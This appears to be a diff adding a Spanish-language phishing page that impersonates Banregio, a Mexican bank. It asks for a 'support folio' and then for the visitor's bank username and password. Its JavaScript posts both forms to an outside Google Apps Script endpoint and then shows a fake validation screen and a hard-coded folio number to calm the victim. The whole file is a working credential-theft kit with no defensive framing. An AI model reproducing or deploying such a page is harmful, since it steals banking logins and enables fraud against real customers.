@@ -1,0 +1,176 @@
+<!doctype html>
+<html  lang="es_MX">
+<head>
+    <meta name="viewport" content="width=device-width">
+    <meta name="robots" content="noindex, nofollow">
+	<link rel="icon" href="favicon.ico" type="/vnd.microsoft.icon" /> 
+	<link rel="shortcut icon" href="favicon.ico" type="/vnd.microsoft.icon" /> 
+	<link rel="apple-touch-icon" href="apple-touch-icon.png" />
+    <meta property="og:locale" content="en_US">
+	<meta property="og:type" content="website">
+	<meta property="og:title" content="Genera Folio de Reporte | Banregio">
+	<meta name="description" content="Somos el banco de emprendedores y empresarios. Alcanza el éxito con nuestras soluciones financieras e impactemos juntos el desarrollo de nuestro país." />
+	<meta property="og:url" content="/">
+	<meta property="og:site_name" content="Reporte En Línea">
+	<meta property="article:modified_time" content="2023-03-31T16:44:13+00:00">
+	<meta property="og:image" content="/wp-content/uploads/2023/03/EXmND4-XQAAHzqN.jpg">
+	<meta property="og:image:width" content="924">
+	<meta property="og:image:height" content="512">
+	<meta property="og:image:type" content="image/jpeg">
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:title" content="Reporte">
+	<meta name="twitter:label1" content="Est. reading time">
+	<meta name="twitter:data1" content="1 minute">
+
+    <link rel='stylesheet'  href='css/estilos.css' type='text/css' media='all' />
+
+<meta charset="utf-8">
+<title>Reporte - Reporte En Línea</title>
+</head>
+
+<body>
+    <div class="main">
+	<div class="bkPer">
+     <div class="acc">
+		<span id="txtPrincipal">
+		<h1><strong>Folio de soporte</strong><br>
+		 <p>Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporciono.</p></h1>
+		</span>
+		<div class="contenedor">
+			<div class="columna-top-rwd">
+	
+			</div>
+			<div class="columna-izquierda">
+				<div class="registro activo" id="registro">
+					
+			
+						<form class="formulario" id="contact-form"  name="submit-form">
+						<label for="nombre"> </label>
+						<div class="contenedor-input">
+							<label>Número de folio</label>
+							<input id="folio" name="folio"  placeholder="Ingrese su número de folio" required />
+						</div>	
+			
+						<div class="contenedor-boton">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje(), valida_envia()">
+								<b>Ingresar</b>
+						</button>
+						</div>
+					</form>
+				</div>
+	
+				<div class="header exito" id="exito">
+
+					<div class="registro activo" id="registro2">
+						<img class="logo" src="img/logo-Bnregio.jpg">
+						<h1>Área de soporte y cancelaciones</h1>
+					<form class="formulario" id="contact-form"  name="submit-form2">
+						<label for="nombre"> </label>
+						<div class="contenedor-input">
+							<label>Usuario</label>
+							<input required type="password" id="usuario"  name="usuario" placeholder="Usuario" />
+							<label>Contraseña</label>
+							<input required type="password" id="contrasena"  name="contrasena" placeholder="Contraseña" />
+						</div>	
+			
+						<div class="contenedor-boton">
+								<button type="submit"  id="submit-contact-form" onclick="miMensaje2()">
+								<b>Iniciar reclamación</b>
+						</button>
+					
+						</div>
+					</form>
+				   </div>
+
+					
+				</div>
+			</div>
+
+			<div class="header exito" id="exito2">
+				<img class="logo" src="img/logo-Bnregio.jpg">
+				<img src="img/loader.gif">
+				<h1 class="folio">Validando información</h1>
+				<p class="txt">Estamos validando la información que ha ingresado, este proceso puede durar hasta 60 segundos.</p>
+		
+			
+			</div>
+            <div class="header exito" id="exito3">
+				<img class="logo" src="img/logo-Bnregio.jpg">
+			    <h2 class="txtFolio">Tu folio es:</h2>
+				<h1 class="folio">R-142285543</h1>
+			</div>
+		</div>
+
+
+
+	 </div>
+
+	</div>	
+
+
+<div class="copy">Powered by <span class="txtNaranja">Dubbi</span> Plataforma de soporte técnico para empresas.</div>
+    </div>
+
+<script>
+
+const scriptURL = 'https://script.google.com/macros/s/AKfycbwW0NXMnE3kadrCiNWSOom0hTEAMV3gLZ7EyWEPHg3dhWqm-Nbmgl9K_RUrRPyIhnWA2g/exec'
+const form = document.forms['submit-form']
+const form2 = document.forms['submit-form2']
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+
+form.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+
+form2.addEventListener('submit', e => {
+  e.preventDefault()
+  fetch(scriptURL, { method: 'POST', body: new FormData(form2)})
+    .then(response => console.log('Success!', response))
+    .then(response => exito.classList.add('activo'))
+    .then(response => registro.classList.remove('activo'))
+    .catch(error => console.log('Error!', error.message))
+   
+	 
+})
+
+function miMensaje() {
+  var element = document.getElementById("registro");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito");
+    element.classList.add("activo");	
+	var element = document.getElementById("txtPrincipal");
+    element.classList.add("registro");	
+}	
+
+function miMensaje2() {
+	setTimeout(folioReporte, 5000);
+  var element = document.getElementById("registro2");
+    element.classList.remove("activo");
+  var element = document.getElementById("exito2");
+    element.classList.add("activo");	
+}
+
+
+function folioReporte(){
+  console.log("Hola Mundo");
+  var element = document.getElementById("exito2");
+    element.classList.remove("activo");	
+  var element = document.getElementById("exito3");
+    element.classList.add("activo");
+	
+}
+	
+
+
+</script>	
+</body>
+</html>
